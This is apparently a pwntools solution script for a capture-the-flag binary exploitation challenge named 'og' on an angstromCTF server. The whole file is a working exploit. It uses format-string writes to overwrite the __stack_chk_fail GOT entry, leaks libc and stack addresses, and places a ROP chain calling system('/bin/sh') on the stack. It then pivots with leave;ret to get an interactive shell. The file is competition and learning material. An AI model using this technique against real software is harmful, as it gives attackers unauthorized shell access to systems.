from pwn import *

# p = process('./og', env={'LD_PRELOAD': './libc.so.6'})
p = remote('challs.actf.co', 31312)
libc = ELF('./libc.so.6')
e = ELF('./og')
context.arch = 'amd64'
context.terminal = 'bash'

addr_start = e.symbols['_start']
payload = f'%{addr_start&0xff}c%10$hhn'.encode()
payload += b'%35$p.%36$p'
payload = payload.ljust(0x20, b'A')
payload += p64(e.got['__stack_chk_fail'])
payload += b'\0'*0x10
p.sendlineafter(b': ', payload)

p.recvuntil(b'0x')
addr = p.recvuntil(b'A')[:-1].split(b'.')
libc.address = int(addr[0], 16) - libc.symbols['__libc_start_main'] - 128
stack = int(addr[1], 16) + 0xf8
log.info(f'libc: {hex(libc.address)}')
log.info(f'stack: {hex(stack)}')

addr_leave = next(e.search(asm('leave; ret')))
addr_ret = addr_leave + 1
addr_pop_rdi = next(libc.search(asm('pop rdi; ret')))
addr_arg = next(libc.search(b'/bin/sh'))

payload = fmtstr_payload(6, {stack:addr_pop_rdi}, write_size='short')
p.sendlineafter(b': ', payload)
payload = fmtstr_payload(6, {stack+0x8:addr_arg}, write_size='short')
p.sendlineafter(b': ', payload)
payload = fmtstr_payload(6, {stack+0x10:libc.symbols['system']}, write_size='short')
p.sendlineafter(b': ', payload)

payload = f'%{addr_ret&0xff}c%8$hhn'.encode()
payload = payload.ljust(0x10, b'A')
payload += p64(e.got['__stack_chk_fail'])
payload = payload.ljust(0x30, b'\0')
payload += p64(stack-0x8)
payload += p64(addr_leave)
p.sendlineafter(b': ', payload)
p.interactive()
